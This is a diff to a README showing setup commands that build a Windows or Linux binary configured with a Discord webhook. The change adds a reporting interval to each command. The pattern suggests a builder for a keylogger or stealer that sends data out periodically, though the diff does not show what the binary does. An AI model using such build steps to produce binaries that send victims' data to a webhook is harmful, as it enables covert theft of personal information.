@@ -29,12 +29,12 @@ Run the setup script:
 
 **For Windows EXE (via Wine):**
 ```bash
-python3 setup.py --webhook YOUR_DISCORD_WEBHOOK --windows
+python3 setup.py --webhook YOUR_DISCORD_WEBHOOK --interval YOUR_TIME --windows
 ```
 
 **For Linux binary:**
 ```bash
-python3 setup.py --webhook YOUR_DISCORD_WEBHOOK --linux
+python3 setup.py --webhook YOUR_DISCORD_WEBHOOK --interval YOUR_TIME --linux
 ```
 
 The setup script will:
@@ -44,7 +44,7 @@ The setup script will:
 
 **Example:**
 ```bash
-python3 setup.py --webhook https://discord.com/api/webhooks/XXXXX/YYYYY --windows
+python3 setup.py --webhook https://discord.com/api/webhooks/XXXXX/YYYYY --interval YOUR_TIME --windows
 ```
 
 ---
